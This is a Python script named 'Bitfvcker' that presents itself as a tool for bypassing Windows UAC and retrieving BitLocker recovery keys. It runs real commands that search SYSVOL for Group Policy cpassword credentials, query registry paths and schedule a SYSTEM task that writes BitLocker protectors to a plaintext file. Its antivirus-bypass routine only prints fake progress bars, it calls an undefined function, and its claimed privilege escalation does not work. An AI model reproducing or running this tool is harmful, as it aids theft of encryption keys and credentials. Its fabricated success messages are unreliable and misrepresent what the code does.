import os
import sys
import time
import ctypes
import winreg
import colorama
import datetime
from prettytable import PrettyTable

colorama.init()

# Color definitions
Red = "\033[1;91m"
Green = "\033[1;92m"
Cyan = "\033[1;96m"
Yellow = "\033[1;93m"
Purple = "\033[1;95m"
Blue = "\033[1;94m"
Bold = "\033[1m"
Reset = colorama.Style.RESET_ALL

# Constants
CMD = r"C:\Windows\System32\cmd.exe"
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
EVENTVWR = r'C:\Windows\System32\eventvwr.exe'
PYTHON_CMD = "python"
REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def type_text(text, speed=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()  

def progress_bar(task_name, duration=3):
    
    length = 30
    for i in range(length + 1):
        percent = int(100 * i / length)
        bar = f"[{'#' * i}{'.' * (length - i)}] {percent}%"
        sys.stdout.write(f"\r{Yellow}{Bold}{task_name}: {bar}{Reset}")
        sys.stdout.flush()
        time.sleep(duration / length)
    print() 

def divider(char="=", length=60, color=Cyan):
    print(f"{color}{char * length}{Reset}")

def header(text):
    divider(char="=", length=60, color=Yellow)
    print(f"{Bold}{Cyan}{text.center(60)}{Reset}")
    divider(char="=", length=60, color=Yellow)

# Check user has admin privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Search registry for cached BitLocker keys
def check_registry_for_keys():
    header("Searching Registry for Cached BitLocker Keys")
    
    reg_paths = [
        r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
        r"HKLM\SYSTEM\CurrentControlSet\Services\FVE\Parameters"
    ]
    
    for path in reg_paths:
        type_text(f"Checking {path} for BitLocker keys...")
        result = os.system(f"reg query {path}")
        
        if result == 0:
            type_text(f"{Green}Found entries in {path}.{Reset}")
        else:
            type_text(f"{Red}No keys found in {path}.{Reset}")

# Exploit GPP vulnerabilities to search for bitkeys
def exploit_gpp():
    header("Searching for Group Policy Preferences (GPP) Vulnerabilities")
    
    # Use findstr method to search for cpassword fields in SYSVOLS
    type_text(f"{Cyan}Searching SYSVOL for GPP credentials...{Reset}")
    os.system('findstr /S /I cpassword C:\\Windows\\SYSVOL\\domain\\Policies\\*.xml')
    type_text(f"{Green}Search completed.{Reset}")

# Use scheduled tasks to run BitLocker command as SYSTEM < admbypass
def use_schtasks_for_bypass():
    header("Using Scheduled Tasks for SYSTEM Privilege")
    
    type_text(f"{Cyan}Creating a scheduled task to run manage-bde with SYSTEM privileges...{Reset}")
    
    script_path = os.path.realpath(__file__)
    cmd = f'schtasks /create /tn "BitLockerTask" /tr "powershell -ExecutionPolicy Bypass -Command \'manage-bde -protectors -get C: > C:\\bitlocker_key.txt\'" /sc once /st 00:00 /ru SYSTEM'
    os.system(cmd)
    
    type_text(f"{Green}Scheduled task created. The BitLocker key will be saved to C:\\bitlocker_key.txt.{Reset}")
    type_text(f"{Yellow}Wait for the scheduled task to execute...{Reset}")

def bitkeygrab():
    header("Retrieving BitLocker Key")
    
    available_drives = [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]

    if available_drives:
        table = PrettyTable()
        table.field_names = [f"{Bold}{Cyan}Drive Number{Reset}", f"{Bold}{Cyan}Drive{Reset}"]
        
        for i, drive in enumerate(available_drives):
            table.add_row([i + 1, drive])

        print(table)
        
        choice = input(f"{Bold}{Blue}Choose OS installation drive by number:{Reset} ")
        if choice.isdigit() and 1 <= int(choice) <= len(available_drives):
            chosen_drive = available_drives[int(choice) - 1]
            
            
            if is_admin():
                type_text(f"{Cyan}Attempting to retrieve BitLocker key from {chosen_drive}...{Reset}")
                
                
                getkey_cmd = f"manage-bde -protectors -get {chosen_drive[:-1]}"  
                result = os.system(getkey_cmd)
                
                if result == 0:  
                    type_text(f"{Green}BitLocker key retrieved successfully from {chosen_drive}.{Reset}")
                else:
                    type_text(f"{Red}Failed to retrieve BitLocker key. Ensure the drive is encrypted and you have sufficient permissions.{Reset}")
            else:
                type_text(f"{Red}Admin privileges required to retrieve BitLocker key!{Reset}")
        else:
            type_text(f"{Red}Invalid choice.{Reset}")
    else:
        type_text(f"{Red}No drives detected!{Reset}")

# shutdown av with progress bar
def bypass_antivirus():
    header("Bypassing Antivirus Protection")
    
    if not is_admin():
        type_text(f"{Red}Cannot modify antivirus settings without admin privileges.{Reset}")
        return
    
    tasks = [
        ("Adding Exclusion to Windows Defender", "Added exclusion to Windows Defender"),
        ("Stopping Windows Defender service", "Stopped Windows Defender service"),
        ("Disabling Real-time Protection", "Disabled Real-time Protection"),
        ("Killing Windows Defender process", "Killed Windows Defender process"),
        ("Stopping Windows Security Center service", "Stopped Windows Security Center service"),
        ("Disabling Tamper Protection", "Tamper Protection disabled (may require restart)")
    ]

    for task_name, success_message in tasks:
        progress_bar(task_name, duration=3)
        type_text(f"{Green}{Bold}{success_message}.{Reset}")
        time.sleep(1)

    time.sleep(3)

# Various admin bypass methods
def admin_bypass_schtasks():
    bypass_antivirus()
    time.sleep(5)
    
    script_path = os.path.realpath(__file__)
    run_time = (datetime.datetime.now() + datetime.timedelta(minutes=1)).strftime("%H:%M")
    
    create_cmd = f'schtasks /create /tn "MyTask" /sc once /tr "powershell.exe -ExecutionPolicy Bypass -File {script_path}" /st {run_time}'
    os.system(create_cmd)
    type_text(f"{Cyan}Task created.{Reset}")

    run_cmd = 'schtasks /run /tn "MyTask"'
    os.system(run_cmd)
    type_text(f"{Cyan}Task executed.{Reset}")

    delete_cmd = 'schtasks /delete /tn "MyTask" /f'
    os.system(delete_cmd)
    type_text(f"{Cyan}Task deleted.{Reset}")
    
    if is_admin():
        type_text(f"{Green}Admin Bypass Successful via Task Scheduler. Attempting to grab BitLocker key.{Reset}")
        bitkeygrab()
        return True
    else:
        type_text(f"{Red}Admin Bypass via Task Scheduler failed.{Reset}")
        return False

def main_menu():
    username = os.environ.get('USER') or os.environ.get('USERNAME') or "User"
    ascii_art = f"""{Purple}
██████  ██ ████████ ███████ ██    ██  ██████ ██   ██ ███████ ██████  
██   ██ ██    ██    ██      ██    ██ ██      ██  ██  ██      ██   ██ 
██████  ██    ██    █████   ██    ██ ██      █████   █████   ██████  
██   ██ ██    ██    ██       ██  ██  ██      ██  ██  ██      ██   ██ 
██████  ██    ██    ██        ████    ██████ ██   ██ ███████ ██   ██ 
                                                                     
{Reset}"""
    type_text(ascii_art, speed=0.005)

    type_text(f"{Cyan}Welcome {username} to Bitfvcker, a tool created to bypass Windows UAC and retrieve BitLocker Recovery Keys!{Reset}", speed=0.03)
    type_text(f"{Cyan}[+] Created by Lol.Spades [+]{Reset}\n", speed=0.03)
    
    table = PrettyTable()
    table.field_names = [f"{Cyan}Option{Reset}", f"{Cyan}Description{Reset}"]
    table.add_row(["1", "Simple Key Grab Non-Admin Method"])
    table.add_row(["2", "Aggressive Key Grab With Admin UAC BYPASS"])
    table.add_row(["3", "Hail Mary!!! ALL Known BitLocker Bypass Methods"])
    table.add_row(["4", "Search Registry for Cached BitLocker Keys"])
    table.add_row(["5", "Use Scheduled Tasks to Retrieve BitLocker Key"])
    table.add_row(["6", "Exploit Group Policy Preferences (GPP)"])

    print(table)

    choice = input(f"{Bold}{Blue}Insert Numerical Choice Here:{Reset} ")

    if choice == '1':
        type_text(f"{Cyan}Attempting Command Line Key Grab Method...{Reset}")
        bitkeygrab()  
    elif choice == '2':
        type_text(f"{Cyan}Attempting Privilege Escalation Exploit To Get BitLocker Key.{Reset}")
        admin_bypass_schtasks()  
    elif choice == '3':
        type_text(f"{Cyan}Executing Payloads 1 By 1 Until Key Is Given Or All Exploits Fail.{Reset}")
        HailMary()
    elif choice == '4':
        check_registry_for_keys()
    elif choice == '5':
        use_schtasks_for_bypass()
    elif choice == '6':
        exploit_gpp()
    else:
        type_text(f"{Red}Invalid choice. Exiting.{Reset}")
        sys.exit(1)

if __name__ == "__main__":
    main_menu()
